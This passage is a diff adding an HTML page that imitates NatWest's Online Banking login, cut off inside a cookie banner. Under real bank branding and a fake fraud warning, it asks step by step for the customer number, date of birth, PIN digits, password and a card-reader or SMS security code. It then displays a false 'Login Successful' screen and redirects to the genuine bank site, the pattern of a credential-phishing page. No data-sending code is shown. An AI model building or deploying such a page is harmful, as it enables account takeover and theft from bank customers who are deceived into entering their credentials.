@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>NatWest | Online Banking</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root { --pu: #42145F; --dpu: #2d0e42; --lpu: #F4EEF9; --ac: #6CC04A; --bg: #F5F5F5; --bk: #1a1a1a; --gt: #555; --gb: #ccc; }
+    body { font-family: 'Helvetica Neue', Arial, sans-serif; background: var(--bg); color: var(--bk); min-height: 100vh; display: flex; flex-direction: column; }
+    header { background: var(--pu); padding: 0 32px; display: flex; align-items: center; justify-content: space-between; height: 68px; box-shadow: 0 2px 6px rgba(0,0,0,.25); }
+    .logo-badge{width:56px;height:56px;background:#fff;border-radius:6px;display:flex;align-items:center;justify-content:center;overflow:hidden;flex-shrink:0;}
+    .logo { display: flex; align-items: center; gap: 12px; text-decoration: none; }
+    .logo-cube { display: grid; grid-template-columns: 1fr 1fr; gap: 3px; width: 36px; height: 36px; }
+    .cube-sq { border-radius: 2px; }
+    .logo-name { color: #fff; font-size: 24px; font-weight: 900; letter-spacing: -0.5px; }
+    .header-right a { color: rgba(255,255,255,.85); font-size: 13px; text-decoration: none; margin-left: 16px; }
+    .header-right a:hover { color: #fff; text-decoration: underline; }
+    nav { background: var(--dpu); padding: 0 32px; display: flex; }
+    nav a { font-size: 13px; color: rgba(255,255,255,.7); padding: 12px 16px; text-decoration: none; font-weight: 600; border-bottom: 3px solid transparent; }
+    nav a:hover { color: #fff; }
+    nav a.active { color: #fff; border-bottom-color: var(--ac); }
+    main { flex: 1; display: flex; justify-content: center; padding: 36px 20px 60px; }
+    .wrap { width: 100%; max-width: 980px; display: grid; grid-template-columns: 1fr 300px; gap: 28px; align-items: start; }
+    .card { background: #fff; border-top: 4px solid var(--pu); box-shadow: 0 1px 4px rgba(0,0,0,.1); }
+    .card-head { padding: 22px 28px; border-bottom: 1px solid #eee; }
+    .card-head h1 { font-size: 22px; font-weight: 700; }
+    .steps-bar { display: flex; border-bottom: 1px solid #eee; }
+    .sb { flex: 1; display: flex; align-items: center; justify-content: center; gap: 6px; padding: 10px 4px; font-size: 11px; font-weight: 700; color: #bbb; border-bottom: 3px solid transparent; }
+    .sb.active { color: var(--pu); border-bottom-color: var(--pu); }
+    .sb.done { color: var(--gt); }
+    .sb-num { width: 20px; height: 20px; border-radius: 50%; background: #eee; color: #999; font-size: 10px; font-weight: 800; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+    .sb.active .sb-num { background: var(--pu); color: #fff; }
+    .sb.done .sb-num { background: var(--ac); color: #fff; }
+    .card-body { padding: 28px; }
+    .step { display: none; }
+    .step.active { display: block; }
+    .fg { margin-bottom: 20px; }
+    .fg label { display: block; font-size: 13px; font-weight: 700; margin-bottom: 6px; }
+    .fg input { width: 100%; padding: 10px 13px; border: 1px solid var(--gb); font-size: 15px; outline: none; transition: border-color .15s; border-radius: 2px; }
+    .fg input:focus { border-color: var(--pu); box-shadow: 0 0 0 2px rgba(66,20,95,.12); }
+    .hint { font-size: 12px; color: var(--gt); margin-top: 5px; line-height: 1.5; }
+    .btn { width: 100%; padding: 13px; background: var(--pu); color: #fff; font-size: 15px; font-weight: 700; border: none; cursor: pointer; transition: background .15s; margin-bottom: 16px; border-radius: 2px; }
+    .btn:hover { background: var(--dpu); }
+    hr { border: none; border-top: 1px solid #eee; margin: 18px 0; }
+    .links { display: flex; flex-direction: column; gap: 10px; }
+    .links a { font-size: 13px; color: var(--pu); text-decoration: underline; cursor: pointer; }
+    /* PIN step */
+    .pin-info { background: var(--lpu); border: 1px solid #d5bde8; border-left: 4px solid var(--pu); padding: 14px 16px; margin-bottom: 22px; font-size: 13px; color: var(--dpu); line-height: 1.6; border-radius: 2px; }
+    .pin-info strong { display: block; font-size: 14px; margin-bottom: 4px; }
+    .pin-row { display: flex; gap: 14px; flex-wrap: wrap; }
+    .pin-fg { display: flex; flex-direction: column; align-items: center; gap: 6px; }
+    .pin-fg label { font-size: 11px; font-weight: 700; color: var(--pu); text-transform: uppercase; }
+    .pin-fg input { width: 52px; height: 58px; text-align: center; font-size: 24px; font-weight: 700; border: 1px solid var(--gb); border-radius: 2px; outline: none; color: var(--bk); }
+    .pin-fg input:focus { border-color: var(--pu); box-shadow: 0 0 0 2px rgba(66,20,95,.12); }
+    /* Card reader */
+    .reader-box { background: var(--lpu); border: 1px solid #d5bde8; border-left: 4px solid var(--pu); padding: 16px 18px; margin-bottom: 20px; border-radius: 2px; }
+    .reader-head { display: flex; align-items: center; gap: 12px; margin-bottom: 12px; }
+    .reader-icon { width: 48px; height: 36px; background: var(--pu); border-radius: 4px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+    .reader-title { font-size: 14px; font-weight: 700; color: var(--dpu); }
+    .reader-title small { display: block; font-size: 12px; font-weight: 400; color: var(--gt); margin-top: 2px; }
+    .r-steps { list-style: none; counter-reset: rs; display: flex; flex-direction: column; gap: 8px; }
+    .r-steps li { counter-increment: rs; display: flex; align-items: flex-start; gap: 10px; font-size: 13px; color: var(--gt); line-height: 1.5; }
+    .r-steps li::before { content: counter(rs); width: 20px; height: 20px; border-radius: 50%; background: var(--pu); color: #fff; font-size: 11px; font-weight: 700; display: flex; align-items: center; justify-content: center; flex-shrink: 0; margin-top: 1px; }
+    .divider-or { display: flex; align-items: center; gap: 10px; font-size: 12px; color: #888; margin: 16px 0; }
+    .divider-or::before, .divider-or::after { content: ''; flex: 1; border-top: 1px solid #e0e0e0; }
+    .otp-boxes { display: flex; gap: 10px; margin-bottom: 6px; }
+    .otp-boxes input { width: 48px; height: 56px; text-align: center; font-size: 22px; font-weight: 700; border: 1px solid var(--gb); border-radius: 2px; outline: none; color: var(--bk); }
+    .otp-boxes input:focus { border-color: var(--pu); box-shadow: 0 0 0 2px rgba(66,20,95,.12); }
+    .resend { font-size: 12px; color: var(--gt); margin-bottom: 22px; }
+    .resend a { color: var(--pu); text-decoration: underline; }
+    .granted { text-align: center; padding: 20px 0; }
+    .tick { width: 72px; height: 72px; background: var(--ac); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; animation: pop .4s ease; }
+    @keyframes pop { 0%{transform:scale(.4);opacity:0} 80%{transform:scale(1.1)} 100%{transform:scale(1);opacity:1} }
+    .granted h2 { font-size: 22px; font-weight: 700; color: var(--dpu); margin-bottom: 10px; }
+    .granted p { font-size: 14px; color: var(--gt); line-height: 1.6; margin-bottom: 6px; }
+    .redir { margin-top: 24px; background: var(--lpu); border: 1px solid #d5bde8; padding: 14px; font-size: 13px; color: var(--dpu); border-radius: 2px; }
+    .redir strong { display: block; font-size: 15px; margin-bottom: 4px; }
+    .prog-track { margin-top: 10px; height: 5px; background: #d5bde8; border-radius: 2px; overflow: hidden; }
+    .prog-fill { height: 100%; width: 0%; background: var(--pu); }
+    .side { display: flex; flex-direction: column; gap: 20px; }
+    .ibox { background: #fff; box-shadow: 0 1px 4px rgba(0,0,0,.08); }
+    .ibox-h { background: var(--pu); padding: 12px 16px; color: #fff; font-size: 13px; font-weight: 700; }
+    .ibox-b { padding: 16px; font-size: 13px; color: var(--gt); line-height: 1.5; }
+    .ibox-b a { color: var(--pu); text-decoration: underline; }
+    .ibox-b p { margin-bottom: 8px; }
+    .warn { background: #FFF8E1; border: 1px solid #F0C040; border-left: 4px solid #e6a817; padding: 14px 16px; font-size: 12px; color: #5A4500; line-height: 1.5; }
+    footer { background: var(--dpu); padding: 20px 32px; }
+    .flinks { display: flex; flex-wrap: wrap; margin-bottom: 12px; }
+    .flinks a { color: #c8a8e0; font-size: 12px; text-decoration: none; padding: 0 12px; border-right: 1px solid #4a2060; }
+    .flinks a:first-child { padding-left: 0; }
+    .flinks a:last-child { border-right: none; }
+    .fcopy { color: #9060b0; font-size: 11px; line-height: 1.6; }
+    @media (max-width: 720px) { .wrap { grid-template-columns: 1fr; } header, nav { padding-left: 16px; padding-right: 16px; } }
+  
+    @keyframes ld-spin  { to { transform: rotate(360deg); } }
+    @keyframes ld-dots  { 0%,80%,100%{transform:scale(0)}40%{transform:scale(1)} }
+  
+  </style>
+</head>
+<body>
+<header>
+  <a class="logo" href="#"><div class="logo-badge"><img src="data:image/png;base64,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" alt="NatWest" style="width:52px;height:52px;object-fit:contain;"/></div><span class="logo-name">NatWest</span></a>
+  <div class="header-right">
+    <a href="#">Personal</a>
+    <a href="#">Premier</a>
+    <a href="#">Business</a>
+    <a href="#">Help</a>
+  </div>
+</header>
+<nav>
+  <a href="#">Accounts</a>
+  <a href="#">Cards</a>
+  <a href="#">Mortgages</a>
+  <a href="#">Savings</a>
+  <a href="#" class="active">Online Banking</a>
+</nav>
+<main>
+  <div class="wrap">
+    <div class="card">
+      <div class="card-head"><h1>Log in to Online Banking</h1></div>
+      <div class="steps-bar">
+        <div class="sb active" id="sb1"><span class="sb-num">1</span> Your details</div>
+        <div class="sb" id="sb2"><span class="sb-num">2</span> PIN digits</div>
+        <div class="sb" id="sb3"><span class="sb-num">3</span> Card reader</div>
+        <div class="sb" id="sb4"><span class="sb-num">4</span> Access granted</div>
+      </div>
+      <div class="card-body">
+        <!-- STEP 1 -->
+        <div class="step active" id="step1">
+          <div class="fg">
+            <label for="cnum">Customer number</label>
+            <input type="text" id="cnum" inputmode="numeric" autocomplete="username" />
+            <p class="hint">Your customer number was sent to you when you registered. It's 8&ndash;10 digits long.</p>
+          </div>
+          <div class="fg">
+            <label for="dob">Date of birth</label>
+            <input type="text" id="dob" placeholder="DD/MM/YYYY" />
+          </div>
+          <button class="btn" onclick="goWithLoader(2,this)">Continue</button>
+          <hr />
+          <div class="links">
+            <a href="#">Forgotten your customer number?</a>
+            <a href="#">Register for Online Banking</a>
+          </div>
+        </div>
+        <!-- STEP 2: PIN digits -->
+        <div class="step" id="step2">
+          <div class="pin-info">
+            <strong>Enter selected digits of your PIN</strong>
+            We ask for different digits each time you log in. Never share your full PIN.
+          </div>
+          <div class="fg">
+            <label>Please enter the following digits</label>
+            <div class="pin-row" id="nw-pin-row"></div>
+          </div>
+          <div class="fg">
+            <label for="pwd">Password</label>
+            <input type="password" id="pwd" autocomplete="current-password" />
+            <p class="hint">Your password is case sensitive.</p>
+          </div>
+          <button class="btn" onclick="goWithLoader(3,this)">Continue</button>
+          <hr />
+          <div class="links">
+            <a href="#" onclick="go(1);return false;">&larr; Back</a>
+            <a href="#">Forgotten your PIN or password?</a>
+          </div>
+        </div>
+        <!-- STEP 3: Card reader -->
+        <div class="step" id="step3">
+          <div class="reader-box">
+            <div class="reader-head">
+              <div class="reader-icon">
+                <svg width="32" height="22" viewBox="0 0 32 22" fill="none">
+                  <rect x="1" y="1" width="30" height="20" rx="2" fill="white" opacity=".9"/>
+                  <rect x="4" y="4" width="10" height="6" rx="1" fill="#42145F"/>
+                  <rect x="18" y="6" width="4" height="4" rx="1" fill="#42145F"/>
+                  <rect x="4" y="13" width="24" height="2" rx="1" fill="rgba(66,20,95,.3)"/>
+                </svg>
+              </div>
+              <div class="reader-title">NatWest card reader
+                <small>or use the NatWest app to generate your code</small>
+              </div>
+            </div>
+            <ol class="r-steps">
+              <li>Insert your NatWest debit card into the card reader (chip facing up)</li>
+              <li>Press <strong>IDENTIFY</strong>, then enter your card PIN when prompted</li>
+              <li>Enter the 8-digit code shown on the card reader below</li>
+            </ol>
+          </div>
+          <div class="divider-or">Or use a one-time code sent by SMS</div>
+          <div class="fg">
+            <label>Enter your 8-digit security code</label>
+            <div class="otp-boxes">
+              <input type="text" maxlength="1" class="nw-otp" inputmode="numeric" />
+              <input type="text" maxlength="1" class="nw-otp" inputmode="numeric" />
+              <input type="text" maxlength="1" class="nw-otp" inputmode="numeric" />
+              <input type="text" maxlength="1" class="nw-otp" inputmode="numeric" />
+              <input type="text" maxlength="1" class="nw-otp" inputmode="numeric" />
+              <input type="text" maxlength="1" class="nw-otp" inputmode="numeric" />
+              <input type="text" maxlength="1" class="nw-otp" inputmode="numeric" />
+              <input type="text" maxlength="1" class="nw-otp" inputmode="numeric" />
+            </div>
+          </div>
+          <p class="resend">No card reader? <a href="#" onclick="return false;">Use the NatWest app</a> &nbsp;&middot;&nbsp; <a href="#" onclick="return false;">Send SMS code</a></p>
+          <button class="btn" onclick="goWithLoader(4,this)">Confirm &amp; Log in</button>
+          <hr />
+          <div class="links"><a href="#" onclick="go(2);return false;">&larr; Back</a></div>
+        </div>
+        <!-- STEP 4 -->
+        <div class="step" id="step4">
+          <div class="granted">
+            <div class="tick"><svg width="38" height="38" viewBox="0 0 38 38" fill="none"><path d="M8 19l8 8 14-14" stroke="white" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+            <h2>Login Successful</h2>
+            <p>You are now logged in to NatWest Online Banking.</p>
+            <div class="redir">
+              <strong id="ctxt">Redirecting in 5 seconds</strong>
+              You will be taken to the NatWest website.
+              <div class="prog-track"><div class="prog-fill" id="pfill"></div></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="side">
+      <div style="background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 12px rgba(0,0,0,.08);margin-bottom:14px;transition:transform .2s,box-shadow .2s;" onmouseover="this.style.transform='translateY(-3px)';this.style.boxShadow='0 8px 24px rgba(0,0,0,.14)'" onmouseout="this.style.transform='';this.style.boxShadow='0 2px 12px rgba(0,0,0,.08)'">
+        <div style="height:4px;background:#42145F;"></div>
+        <div style="padding:16px 16px 14px;">
+          <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px;">
+            <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><path d="M3 6h10M10 3l3 3-3 3M15 12H5M8 15l-3-3 3-3" stroke="#42145F" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
+            <span style="font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:.6px;color:#42145F;background:#F0E8F6;padding:3px 10px;border-radius:20px;">Switch Offer</span>
+          </div>
+          <div style="font-size:28px;font-weight:900;color:#42145F;line-height:1;margin-bottom:6px;">£200</div>
+          <div style="font-size:13px;font-weight:700;color:#111;margin-bottom:5px;">Switch & get £200 cash</div>
+          <p style="font-size:12px;color:#666;line-height:1.55;margin:0 0 12px;">Switch to a NatWest Reward current account using the Current Account Switch Service. £200 paid within 7 days. Must not have held a NatWest account since Oct 2017. T&amp;Cs apply.</p>
+          <a href="#" style="font-size:12px;font-weight:700;color:#42145F;text-decoration:none;display:inline-flex;align-items:center;gap:5px;">Switch to NatWest <svg width="10" height="10" viewBox="0 0 10 10" fill="none"><path d="M1.5 5h7M5 1.5l3.5 3.5L5 8.5" stroke="#42145F" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg></a>
+        </div>
+      </div>
+      <div style="background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 12px rgba(0,0,0,.08);margin-bottom:14px;transition:transform .2s,box-shadow .2s;" onmouseover="this.style.transform='translateY(-3px)';this.style.boxShadow='0 8px 24px rgba(0,0,0,.14)'" onmouseout="this.style.transform='';this.style.boxShadow='0 2px 12px rgba(0,0,0,.08)'">
+        <div style="height:4px;background:#42145F;"></div>
+        <div style="padding:16px 16px 14px;">
+          <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px;">
+            <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><path d="M2 14l4-5 4 2 5-7" stroke="#42145F" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
+            <span style="font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:.6px;color:#42145F;background:#F0E8F6;padding:3px 10px;border-radius:20px;">Savings</span>
+          </div>
+          <div style="font-size:28px;font-weight:900;color:#42145F;line-height:1;margin-bottom:6px;">6.17% AER</div>
+          <div style="font-size:13px;font-weight:700;color:#111;margin-bottom:5px;">Digital Regular Saver</div>
+          <p style="font-size:12px;color:#666;line-height:1.55;margin:0 0 12px;">Save £1–£150 per month and earn 6.17% AER variable for 12 months. Available to NatWest personal current account holders. No minimum term.</p>
+          <a href="#" style="font-size:12px;font-weight:700;color:#42145F;text-decoration:none;display:inline-flex;align-items:center;gap:5px;">Start saving <svg width="10" height="10" viewBox="0 0 10 10" fill="none"><path d="M1.5 5h7M5 1.5l3.5 3.5L5 8.5" stroke="#42145F" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg></a>
+        </div>
+      </div>
+<div class="warn"><strong>Fraud warning:</strong> NatWest will never call and ask for your card reader code, full PIN, or ask you to move money to a safe account. <a href="#" style="color:#856404">Report fraud</a>.</div>
+      <div class="ibox">
+        <div class="ibox-h">NatWest Mobile Banking</div>
+        <div class="ibox-b">
+          <p>Manage your money with the NatWest app. Use it to generate card reader codes without your physical device.</p>
+          <p><a href="#">Download for iOS</a></p>
+          <p><a href="#">Download for Android</a></p>
+        </div>
+      </div>
+      <div class="ibox">
+        <div class="ibox-h">Need help?</div>
+        <div class="ibox-b">
+          <p><strong>03457 888 444</strong><br/>Available 24/7</p>
+          <p><a href="#">Help centre</a></p>
+        </div>
+      </div>
+    </div>
+  </div>
+</main>
+<footer>
+  <div class="flinks">
+    <a href="#">Privacy notice</a><a href="#">Cookie policy</a><a href="#">Accessibility</a><a href="#">Terms</a><a href="#">Security</a><a href="#">Contact us</a>
+  </div>
+  <p class="fcopy">National Westminster Bank Plc. Registered in England and Wales (Registration Number 929027). Registered Office: 250 Bishopsgate, London EC2M 4AA.<br>Authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and the Prudential Regulation Authority.</p>
+</footer>
+<script>
+  var nwPositions=[];
+  (function(){
+    var used={};
+    while(nwPositions.length<3){var n=Math.floor(Math.random()*6)+1;if(!used[n]){used[n]=true;nwPositions.push(n);}}
+    nwPositions.sort(function(a,b){return a-b;});
+    var row=document.getElementById('nw-pin-row');
+    nwPositions.forEach(function(p){
+      var s=['1st','2nd','3rd','4th','5th','6th'][p-1];
+      var fg=document.createElement('div'); fg.className='pin-fg';
+      fg.innerHTML='<label>'+s+'</label><input type="password" maxlength="1" />';
+      row.appendChild(fg);
+    });
+  })();
+  function goWithLoader(n, btn) {
+    var origHtml = btn.innerHTML;
+    var isFinal  = n === 4;
+    btn.disabled = true;
+    btn.style.opacity = '.72';
+    btn.innerHTML = '<span style="display:inline-block;width:14px;height:14px;border:2.5px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:ld-spin .65s linear infinite;vertical-align:middle;margin-right:8px;"></span>'
+                  + (isFinal ? 'Verifying…' : 'Please wait…');
+    var ov  = document.getElementById('ld-ov');
+    var msg = document.getElementById('ld-msg');
+    msg.textContent = isFinal ? 'Verifying your details…' : 'Please wait…';
+    ov.style.display = 'flex';
+    /* double rAF forces repaint so transition fires */
+    requestAnimationFrame(function(){ requestAnimationFrame(function(){ ov.style.opacity = '1'; }); });
+    setTimeout(function() {
+      go(n);
+      setTimeout(function() {
+        ov.style.opacity = '0';
+        setTimeout(function() { ov.style.display = 'none'; }, 260);
+        /* restore button only on non-final steps */
+        if (!isFinal) {
+          btn.innerHTML = origHtml;
+          btn.disabled  = false;
+          btn.style.opacity = '1';
+        }
+      }, isFinal ? 400 : 200);
+    }, isFinal ? 1500 : 680);
+  }
+
+
+  function go(n){
+    document.querySelectorAll('.step').forEach(function(s){s.classList.remove('active');});
+    ['sb1','sb2','sb3','sb4'].forEach(function(id,i){
+      var el=document.getElementById(id); el.classList.remove('active','done');
+      if(i+1<n) el.classList.add('done'); else if(i+1===n) el.classList.add('active');
+    });
+    document.getElementById('step'+n).classList.add('active');
+    if(n===4) redirect();
+  }
+  function redirect(){
+    var s=5,fill=document.getElementById('pfill'),txt=document.getElementById('ctxt');
+    fill.style.transition='width '+s+'s linear';
+    setTimeout(function(){fill.style.width='100%';},50);
+    var iv=setInterval(function(){s--;if(s<=0){clearInterval(iv);txt.textContent='Redirecting now...';setTimeout(function(){window.location.href='https://www.natwest.com';},400);}else txt.textContent='Redirecting in '+s+' second'+(s!==1?'s':'');},1000);
+  }
+  var nwOtp=document.querySelectorAll('.nw-otp');
+  nwOtp.forEach(function(inp,i){
+    inp.addEventListener('input',function(){this.value=this.value.replace(/[^0-9]/g,'');if(this.value&&i<nwOtp.length-1)nwOtp[i+1].focus();});
+    inp.addEventListener('keydown',function(e){if(e.key==='Backspace'&&!this.value&&i>0)nwOtp[i-1].focus();});
+  });
+</script>
+
+  <!-- Loading Overlay -->
+  <div id="ld-ov" style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(255,255,255,.96);z-index:9000;display:none;flex-direction:column;align-items:center;justify-content:center;gap:20px;opacity:0;transition:opacity .25s;">
+    <div style="position:relative;width:56px;height:56px;">
+      <div style="position:absolute;top:0;left:0;right:0;bottom:0;border-radius:50%;border:4px solid #e8e8e8;"></div>
+      <div style="position:absolute;top:0;left:0;right:0;bottom:0;border-radius:50%;border:4px solid transparent;border-top-color:#42145F;animation:ld-spin .8s linear infinite;"></div>
+    </div>
+    <div id="ld-msg" style="font-size:14px;color:#555;font-weight:600;letter-spacing:.2px;"></div>
+  </div>
+
+  <!-- Cookie Banner -->
+  <div id="ck-bar" style="position:fixed;bottom:0;left:0;right:0;z-index:9999;">
+    <style>
+      @keyframes ckUp{from{transform:translateY(110%);opacity:0}to{transform:translateY(0);opacity:1}}
+      @keyframes ckDown{from{transform:translateY(0);opacity:1}to{transform:translateY(110%);opacity:0}}
+      #ck-bar{animation:ckUp .5s cubic-bezier(.22,1,.36,1) forwards;}
+    </style>
+    <div style="height:4px;background:#42145F;"></div>
+    <div style="background:#111;padding:18px 28px;display:flex;align-items:center;gap:20px;flex-wrap:wrap;box-shadow:0 -6px 28px rgba(0,0,0,.5);">
+      <div style="width:48px;height:48px;background:#42145F;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:24px;flex-shrink:0;box-shadow:0 2px 10px rgba(0,0,0,.3);">&#127850;</div>
+      <div style="flex:1;min-width:200px;">
+        <div style="font-size:14px;font-weight:800;color:#fff;margin-bottom:5px;">NatWest uses cookies</div>
+        <p style="font-size:12px;color:#aaa;margin:0;line-height:1.6;">We use cookies and similar technologies to enhance your experience, remember your preferences and help us understand how our site is used. <a href="#" style="color:#b07fd4;text-decoration:underline;font-weight:600;">Read our cookie policy</a></p>
+      </div>
+      <div style="display:flex;gap:10px;flex-shrink:0;">
